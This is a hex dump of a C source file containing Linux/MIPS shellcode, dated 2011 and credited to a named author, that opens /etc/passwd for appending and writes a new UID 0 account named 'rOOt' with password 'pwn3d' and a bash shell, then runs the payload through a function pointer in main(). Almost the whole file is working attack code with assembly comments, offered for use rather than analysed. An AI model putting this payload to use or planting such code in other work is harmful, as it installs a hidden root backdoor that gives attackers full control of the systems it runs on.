00000000  2f 2a 20 54 69 74 6c 65  3a 20 20 4c 69 6e 75 78  |/* Title:  Linux|
00000010  2f 4d 49 50 53 20 2d 20  61 64 64 20 75 73 65 72  |/MIPS - add user|
00000020  28 55 49 44 20 30 29 20  77 69 74 68 20 70 61 73  |(UID 0) with pas|
00000030  73 77 6f 72 64 20 2d 20  31 36 34 20 62 79 74 65  |sword - 164 byte|
00000040  73 0d 0a 20 2a 20 44 61  74 65 3a 20 20 20 32 30  |s.. * Date:   20|
00000050  31 31 2d 31 31 2d 32 34  0d 0a 20 2a 20 41 75 74  |11-11-24.. * Aut|
00000060  68 6f 72 3a 20 72 69 67  61 6e 20 2d 20 69 6d 72  |hor: rigan - imr|
00000070  69 67 61 6e 20 5b 61 74  5d 20 67 6d 61 69 6c 2e  |igan [at] gmail.|
00000080  63 6f 6d 0d 0a 20 2a 20  4e 6f 74 65 3a 0d 0a 20  |com.. * Note:.. |
00000090  2a 20 20 20 20 20 20 20  20 20 55 73 65 72 6e 61  |*         Userna|
000000a0  6d 65 20 2d 20 72 4f 4f  74 0d 0a 20 2a 20 20 20  |me - rOOt.. *   |
000000b0  20 20 20 20 20 20 50 61  73 73 77 6f 72 64 20 2d  |      Password -|
000000c0  20 70 77 6e 33 64 0d 0a  20 2a 2f 0d 0a 20 0d 0a  | pwn3d.. */.. ..|
000000d0  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
000000e0  68 3e 0d 0a 20 0d 0a 63  68 61 72 20 73 63 5b 5d  |h>.. ..char sc[]|
000000f0  20 3d 0d 0a 20 20 20 20  20 20 20 20 22 5c 78 32  | =..        "\x2|
00000100  34 5c 78 30 39 5c 78 37  33 5c 78 35 30 22 20 20  |4\x09\x73\x50"  |
00000110  20 20 20 20 20 2f 2f 20  20 6c 69 20 20 20 20 20  |     //  li     |
00000120  20 74 31 2c 32 39 35 32  30 0d 0a 20 20 20 20 20  | t1,29520..     |
00000130  20 20 20 22 5c 78 30 35  5c 78 33 30 5c 78 66 66  |   "\x05\x30\xff|
00000140  5c 78 66 66 22 20 20 20  20 20 20 20 2f 2f 20 20  |\xff"       //  |
00000150  62 6c 74 7a 61 6c 20 20  74 31 2c 34 30 30 30 39  |bltzal  t1,40009|
00000160  34 20 3c 4c 3e 0d 0a 20  20 20 20 20 20 20 20 22  |4 <L>..        "|
00000170  5c 78 32 34 5c 78 30 39  5c 78 37 33 5c 78 35 30  |\x24\x09\x73\x50|
00000180  22 20 20 20 20 20 20 20  2f 2f 20 20 6c 69 20 20  |"       //  li  |
00000190  20 20 20 20 74 31 2c 32  39 35 32 30 20 28 6e 6f  |    t1,29520 (no|
000001a0  70 29 0d 0a 20 20 20 20  20 0d 0a 20 20 20 20 20  |p)..     ..     |
000001b0  20 20 20 2f 2a 20 6f 70  65 6e 28 22 2f 65 74 63  |   /* open("/etc|
000001c0  2f 70 61 73 73 77 64 22  2c 20 4f 5f 57 52 4f 4e  |/passwd", O_WRON|
000001d0  4c 59 7c 4f 5f 43 52 45  41 54 7c 4f 5f 41 50 50  |LY|O_CREAT|O_APP|
000001e0  45 4e 44 29 3b 20 2a 2f  0d 0a 20 20 20 20 20 20  |END); */..      |
000001f0  20 20 22 5c 78 33 63 5c  78 30 66 5c 78 33 30 5c  |  "\x3c\x0f\x30\|
00000200  78 32 66 22 20 20 20 20  20 20 20 2f 2f 20 20 6c  |x2f"       //  l|
00000210  75 69 20 20 20 20 20 74  37 2c 30 78 33 30 32 66  |ui     t7,0x302f|
00000220  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 33 35 5c  |..        "\x35\|
00000230  78 65 66 5c 78 36 35 5c  78 37 34 22 20 20 20 20  |xef\x65\x74"    |
00000240  20 20 20 2f 2f 20 20 6f  72 69 20 20 20 20 20 74  |   //  ori     t|
00000250  37 2c 74 37 2c 30 78 36  35 37 34 0d 0a 20 20 20  |7,t7,0x6574..   |
00000260  20 20 20 20 20 22 5c 78  33 63 5c 78 30 65 5c 78  |     "\x3c\x0e\x|
00000270  36 33 5c 78 32 66 22 20  20 20 20 20 20 20 2f 2f  |63\x2f"       //|
00000280  20 20 6c 75 69 20 20 20  20 20 74 36 2c 30 78 36  |  lui     t6,0x6|
00000290  33 32 66 20 20 20 0d 0a  20 20 20 20 20 20 20 20  |32f   ..        |
000002a0  22 5c 78 33 35 5c 78 63  65 5c 78 37 30 5c 78 36  |"\x35\xce\x70\x6|
000002b0  31 22 20 20 20 20 20 20  20 2f 2f 20 20 6f 72 69  |1"       //  ori|
000002c0  20 20 20 20 20 74 36 2c  74 36 2c 30 78 37 30 36  |     t6,t6,0x706|
000002d0  31 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 33 63  |1..        "\x3c|
000002e0  5c 78 30 64 5c 78 37 33  5c 78 37 33 22 20 20 20  |\x0d\x73\x73"   |
000002f0  20 20 20 20 2f 2f 20 20  6c 75 69 20 20 20 20 20  |    //  lui     |
00000300  74 35 2c 30 78 37 33 37  33 0d 0a 20 20 20 20 20  |t5,0x7373..     |
00000310  20 20 20 22 5c 78 33 35  5c 78 61 64 5c 78 37 37  |   "\x35\xad\x77|
00000320  5c 78 36 34 22 20 20 20  20 20 20 20 2f 2f 20 20  |\x64"       //  |
00000330  6f 72 69 20 20 20 20 20  74 35 2c 74 35 2c 30 78  |ori     t5,t5,0x|
00000340  37 37 36 34 0d 0a 20 20  20 20 20 20 20 20 22 5c  |7764..        "\|
00000350  78 61 66 5c 78 61 66 5c  78 66 66 5c 78 66 33 22  |xaf\xaf\xff\xf3"|
00000360  20 20 20 20 20 20 20 2f  2f 20 20 73 77 20 20 20  |       //  sw   |
00000370  20 20 20 74 37 2c 2d 31  33 28 73 70 29 0d 0a 20  |   t7,-13(sp).. |
00000380  20 20 20 20 20 20 20 22  5c 78 61 66 5c 78 61 65  |       "\xaf\xae|
00000390  5c 78 66 66 5c 78 66 37  22 20 20 20 20 20 20 20  |\xff\xf7"       |
000003a0  2f 2f 20 20 73 77 20 20  20 20 20 20 74 36 2c 2d  |//  sw      t6,-|
000003b0  39 28 73 70 29 0d 0a 20  20 20 20 20 20 20 20 22  |9(sp)..        "|
000003c0  5c 78 61 66 5c 78 61 64  5c 78 66 66 5c 78 66 62  |\xaf\xad\xff\xfb|
000003d0  22 20 20 20 20 20 20 20  2f 2f 20 20 73 77 20 20  |"       //  sw  |
000003e0  20 20 20 20 74 35 2c 2d  35 28 73 70 29 0d 0a 20  |    t5,-5(sp).. |
000003f0  20 20 20 20 20 20 20 22  5c 78 61 66 5c 78 61 30  |       "\xaf\xa0|
00000400  5c 78 66 66 5c 78 66 66  22 20 20 20 20 20 20 20  |\xff\xff"       |
00000410  2f 2f 20 20 73 77 20 20  20 20 20 20 7a 65 72 6f  |//  sw      zero|
00000420  2c 2d 31 28 73 70 29 0d  0a 20 20 20 20 20 20 20  |,-1(sp)..       |
00000430  20 22 5c 78 32 37 5c 78  61 34 5c 78 66 66 5c 78  | "\x27\xa4\xff\x|
00000440  66 34 22 20 20 20 20 20  20 20 2f 2f 20 20 61 64  |f4"       //  ad|
00000450  64 69 75 20 20 20 61 30  2c 73 70 2c 2d 31 32 0d  |diu   a0,sp,-12.|
00000460  0a 20 20 20 20 20 20 20  20 22 5c 78 32 34 5c 78  |.        "\x24\x|
00000470  30 35 5c 78 30 31 5c 78  36 64 22 20 20 20 20 20  |05\x01\x6d"     |
00000480  20 20 2f 2f 20 20 6c 69  20 20 20 20 20 20 61 31  |  //  li      a1|
00000490  2c 33 36 35 0d 0a 20 20  20 20 20 20 20 20 22 5c  |,365..        "\|
000004a0  78 32 34 5c 78 30 32 5c  78 30 66 5c 78 61 35 22  |x24\x02\x0f\xa5"|
000004b0  20 20 20 20 20 20 20 2f  2f 20 20 6c 69 20 20 20  |       //  li   |
000004c0  20 20 20 76 30 2c 34 30  30 35 0d 0a 20 20 20 20  |   v0,4005..    |
000004d0  20 20 20 20 22 5c 78 30  31 5c 78 30 31 5c 78 30  |    "\x01\x01\x0|
000004e0  31 5c 78 30 63 22 20 20  20 20 20 20 20 2f 2f 20  |1\x0c"       // |
000004f0  20 73 79 73 63 61 6c 6c  20 30 78 34 30 34 30 34  | syscall 0x40404|
00000500  0d 0a 20 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |.. ..        "\x|
00000510  61 66 5c 78 61 32 5c 78  66 66 5c 78 66 63 22 20  |af\xa2\xff\xfc" |
00000520  20 20 20 20 20 20 2f 2f  20 20 73 77 20 20 20 20  |      //  sw    |
00000530  20 20 76 30 2c 2d 34 28  73 70 29 0d 0a 20 20 20  |  v0,-4(sp)..   |
00000540  20 20 0d 0a 20 20 20 20  20 20 20 20 2f 2a 20 77  |  ..        /* w|
00000550  72 69 74 65 28 66 64 2c  20 22 72 4f 4f 74 3a 58  |rite(fd, "rOOt:X|
00000560  4a 31 47 56 2e 6e 79 46  46 4d 6f 49 3a 30 3a 30  |J1GV.nyFFMoI:0:0|
00000570  3a 72 6f 6f 74 3a 2f 72  6f 6f 74 3a 2f 62 69 6e  |:root:/root:/bin|
00000580  2f 62 61 73 68 5c 6e 22  2c 20 34 35 29 3b 20 2a  |/bash\n", 45); *|
00000590  2f 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 38 66  |/..        "\x8f|
000005a0  5c 78 61 34 5c 78 66 66  5c 78 66 63 22 20 20 20  |\xa4\xff\xfc"   |
000005b0  20 20 20 20 2f 2f 20 20  6c 77 20 20 20 20 20 20  |    //  lw      |
000005c0  61 30 2c 2d 34 28 73 70  29 0d 0a 20 20 20 20 20  |a0,-4(sp)..     |
000005d0  20 20 20 22 5c 78 32 33  5c 78 65 35 5c 78 31 30  |   "\x23\xe5\x10|
000005e0  5c 78 30 63 22 20 20 20  20 20 20 20 2f 2f 20 20  |\x0c"       //  |
000005f0  61 64 64 69 20 20 20 20  61 31 2c 72 61 2c 34 31  |addi    a1,ra,41|
00000600  30 38 0d 0a 20 20 20 20  20 20 20 20 22 5c 78 32  |08..        "\x2|
00000610  30 5c 78 61 35 5c 78 66  30 5c 78 36 30 22 20 20  |0\xa5\xf0\x60"  |
00000620  20 20 20 20 20 2f 2f 20  20 61 64 64 69 20 20 20  |     //  addi   |
00000630  20 61 31 2c 61 31 2c 2d  34 30 30 30 0d 0a 20 20  | a1,a1,-4000..  |
00000640  20 20 20 20 20 20 22 5c  78 32 34 5c 78 30 39 5c  |      "\x24\x09\|
00000650  78 66 66 5c 78 64 33 22  20 20 20 20 20 20 20 2f  |xff\xd3"       /|
00000660  2f 20 20 6c 69 20 20 20  20 20 20 74 31 2c 2d 34  |/  li      t1,-4|
00000670  35 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 30 31  |5..        "\x01|
00000680  5c 78 32 30 5c 78 33 30  5c 78 32 37 22 20 20 20  |\x20\x30\x27"   |
00000690  20 20 20 20 2f 2f 20 20  6e 6f 72 20 20 20 20 20  |    //  nor     |
000006a0  61 32 2c 74 31 2c 7a 65  72 6f 0d 0a 20 20 20 20  |a2,t1,zero..    |
000006b0  20 20 20 20 22 5c 78 32  34 5c 78 30 32 5c 78 30  |    "\x24\x02\x0|
000006c0  66 5c 78 61 34 22 20 20  20 20 20 20 20 2f 2f 20  |f\xa4"       // |
000006d0  20 6c 69 20 20 20 20 20  20 76 30 2c 34 30 30 34  | li      v0,4004|
000006e0  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 30 31 5c  |..        "\x01\|
000006f0  78 30 31 5c 78 30 31 5c  78 30 63 22 20 20 20 20  |x01\x01\x0c"    |
00000700  20 20 20 2f 2f 20 20 73  79 73 63 61 6c 6c 20 30  |   //  syscall 0|
00000710  78 34 30 34 30 34 0d 0a  20 20 20 20 20 20 20 20  |x40404..        |
00000720  20 0d 0a 20 20 20 20 20  20 20 20 2f 2a 20 63 6c  | ..        /* cl|
00000730  6f 73 65 28 66 64 29 3b  20 2a 2f 0d 0a 20 20 20  |ose(fd); */..   |
00000740  20 20 20 20 20 22 5c 78  32 34 5c 78 30 32 5c 78  |     "\x24\x02\x|
00000750  30 66 5c 78 61 36 22 20  20 20 20 20 20 20 2f 2f  |0f\xa6"       //|
00000760  20 20 6c 69 20 20 20 20  20 20 76 30 2c 34 30 30  |  li      v0,400|
00000770  36 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 30 31  |6..        "\x01|
00000780  5c 78 30 31 5c 78 30 31  5c 78 30 63 22 20 20 20  |\x01\x01\x0c"   |
00000790  20 20 20 20 2f 2f 20 20  73 79 73 63 61 6c 6c 20  |    //  syscall |
000007a0  30 78 34 30 34 30 34 0d  0a 20 20 20 20 20 0d 0a  |0x40404..     ..|
000007b0  20 20 20 20 20 20 20 20  2f 2a 20 65 78 69 74 28  |        /* exit(|
000007c0  30 29 3b 20 20 2a 2f 0d  0a 20 20 20 20 20 20 20  |0);  */..       |
000007d0  20 22 5c 78 32 38 5c 78  30 34 5c 78 66 66 5c 78  | "\x28\x04\xff\x|
000007e0  66 66 22 20 20 20 20 20  20 20 20 2f 2f 20 20 73  |ff"        //  s|
000007f0  6c 74 69 20 20 20 20 61  30 2c 7a 65 72 6f 2c 2d  |lti    a0,zero,-|
00000800  31 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 32 34  |1..        "\x24|
00000810  5c 78 30 32 5c 78 30 66  5c 78 61 31 22 20 20 20  |\x02\x0f\xa1"   |
00000820  20 20 20 20 20 2f 2f 20  20 6c 69 20 20 20 20 20  |     //  li     |
00000830  20 76 30 2c 34 30 30 31  0d 0a 20 20 20 20 20 20  | v0,4001..      |
00000840  20 20 22 5c 78 30 31 5c  78 30 31 5c 78 30 31 5c  |  "\x01\x01\x01\|
00000850  78 30 63 22 20 20 20 20  20 20 20 20 2f 2f 20 20  |x0c"        //  |
00000860  73 79 73 63 61 6c 6c 20  30 78 34 30 34 30 34 0d  |syscall 0x40404.|
00000870  0a 20 20 20 20 20 20 0d  0a 20 20 20 20 20 20 20  |.      ..       |
00000880  20 2f 2a 20 20 22 72 4f  4f 74 3a 58 4a 31 47 56  | /*  "rOOt:XJ1GV|
00000890  2e 6e 79 46 46 4d 6f 49  3a 30 3a 30 3a 72 6f 6f  |.nyFFMoI:0:0:roo|
000008a0  74 3a 2f 72 6f 6f 74 3a  2f 62 69 6e 2f 62 61 73  |t:/root:/bin/bas|
000008b0  68 5c 6e 22 20 2a 2f 0d  0a 20 20 20 20 20 20 20  |h\n" */..       |
000008c0  20 22 5c 78 37 32 5c 78  34 66 5c 78 34 66 5c 78  | "\x72\x4f\x4f\x|
000008d0  37 34 22 20 20 20 20 20  20 20 0d 0a 20 20 20 20  |74"       ..    |
000008e0  20 20 20 20 22 5c 78 33  61 5c 78 35 38 5c 78 34  |    "\x3a\x58\x4|
000008f0  61 5c 78 33 31 22 20 20  20 20 20 20 20 0d 0a 20  |a\x31"       .. |
00000900  20 20 20 20 20 20 20 22  5c 78 34 37 5c 78 35 36  |       "\x47\x56|
00000910  5c 78 32 65 5c 78 36 65  22 20 20 20 20 20 20 20  |\x2e\x6e"       |
00000920  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 37 39 5c  |..        "\x79\|
00000930  78 34 36 5c 78 34 36 5c  78 34 64 22 20 20 20 20  |x46\x46\x4d"    |
00000940  20 20 20 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |   ..        "\x|
00000950  36 66 5c 78 34 39 5c 78  33 61 5c 78 33 30 22 20  |6f\x49\x3a\x30" |
00000960  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 20 20  |      ..        |
00000970  22 5c 78 33 61 5c 78 33  30 5c 78 33 61 5c 78 37  |"\x3a\x30\x3a\x7|
00000980  32 22 20 20 20 20 20 20  20 0d 0a 20 20 20 20 20  |2"       ..     |
00000990  20 20 20 22 5c 78 36 66  5c 78 36 66 5c 78 37 34  |   "\x6f\x6f\x74|
000009a0  5c 78 33 61 22 20 20 20  20 20 20 20 0d 0a 20 20  |\x3a"       ..  |
000009b0  20 20 20 20 20 20 22 5c  78 32 66 5c 78 37 32 5c  |      "\x2f\x72\|
000009c0  78 36 66 5c 78 36 66 22  20 20 20 20 20 20 0d 0a  |x6f\x6f"      ..|
000009d0  20 20 20 20 20 20 20 20  22 5c 78 37 34 5c 78 33  |        "\x74\x3|
000009e0  61 5c 78 32 66 5c 78 36  32 22 20 20 20 20 20 20  |a\x2f\x62"      |
000009f0  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 36 39 5c  |..        "\x69\|
00000a00  78 36 65 5c 78 32 66 5c  78 36 32 22 20 20 20 20  |x6e\x2f\x62"    |
00000a10  20 20 20 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |   ..        "\x|
00000a20  36 31 5c 78 37 33 5c 78  36 38 5c 78 30 61 22 3b  |61\x73\x68\x0a";|
00000a30  20 20 20 20 20 20 20 0d  0a 20 20 20 20 20 20 20  |       ..       |
00000a40  0d 0a 76 6f 69 64 20 6d  61 69 6e 28 76 6f 69 64  |..void main(void|
00000a50  29 0d 0a 7b 0d 0a 20 20  20 20 20 20 20 76 6f 69  |)..{..       voi|
00000a60  64 28 2a 73 29 28 76 6f  69 64 29 3b 0d 0a 20 20  |d(*s)(void);..  |
00000a70  20 20 20 20 20 70 72 69  6e 74 66 28 22 73 69 7a  |     printf("siz|
00000a80  65 3a 20 25 64 5c 6e 22  2c 20 73 74 72 6c 65 6e  |e: %d\n", strlen|
00000a90  28 73 63 29 29 3b 0d 0a  20 20 20 20 20 20 20 73  |(sc));..       s|
00000aa0  20 3d 20 73 63 3b 0d 0a  20 20 20 20 20 20 20 73  | = sc;..       s|
00000ab0  28 29 3b 0d 0a 7d                                 |();..}|
00000ab6
